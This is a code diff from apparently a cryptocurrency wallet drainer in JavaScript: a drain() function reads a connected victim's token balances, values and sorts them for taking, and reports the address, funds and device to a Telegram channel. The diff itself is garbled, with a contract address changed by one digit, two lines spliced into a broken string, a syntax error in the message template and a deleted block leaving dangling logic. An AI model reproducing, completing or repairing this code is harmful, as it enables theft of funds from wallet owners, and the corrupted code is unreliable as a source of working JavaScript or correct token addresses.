@@ -120,7 +120,7 @@ const CHAINS = {
       AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
       RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
       MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
-      SUSHI: "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
+      SUSHI: "0x6b3895068778dd592e39a122f4f5a5cf09c90fe2",
       GLM: "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429",
       REP: "0x1985365e9f78359a9b6ad760e32412f4a445e862",
       SNT: "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
@@ -149,8 +149,7 @@ const CHAINS = {
       BAKE: "0xe02df9e3e622debdd69fb838bb799e3f168902c5",
       XVS: "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
       ALPACA: "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
-      AUTO: "0xa184088a740c695e156f91f5cc086a06bb78b827",
-      BURGER: "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
+      AUTO: "0xa184088a740c695e156f91f5cc086a06bb  "0xae9269f27437f0fcbc232d39ec814844a51d6b8f": "BURGERUSDT",
       EPS: "0xa7f552078dcc247c2684336020c03648500c6d9f",
       BELT: "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
       MBOX: "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75",
@@ -452,11 +451,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   // Формируем сообщение
   const message = [
-    `🌀 Connect | [ **${shortAddress}** ]`,
-    ``,
-    `Funds:`,
-    ...funds,
-    `Device: ${device}`
+    `🌀 Connect | [ `${shortAddress}` ]`,
+    `Funds:\n` +
+    `${funds.join('\n')}\n` +
+    `Device: ${device}`;
   ].join('\n');
 
   // Отправляем сообщение в Telegram
@@ -489,31 +487,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const tokenDataResults = await Promise.all(tokenDataPromises);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
-    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
-      bal.tokenBalances[tokenAddress] = realBalance;
-    }
-
-    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
-      const symbol = tokenAddress === config.usdtAddress ? "USDT" :
-                    tokenAddress === config.usdcAddress ? "USDC" :
-                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
-      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
-    }
-  }
-
-  const pricePromises = tokensToProcess.map(async (token) => {
-    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
-    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
-    token.valueInUSDT = balanceInUnits * price;
-    return token;
-  });
-
-  await Promise.all(pricePromises);
-
-  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
-
-  let status = 'rejected';
-  for (const { token, balance, contract, address, decimals } of tokenDataResults) {
     if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
       bal.tokenBalances[tokenAddress] = realBalance;
     }
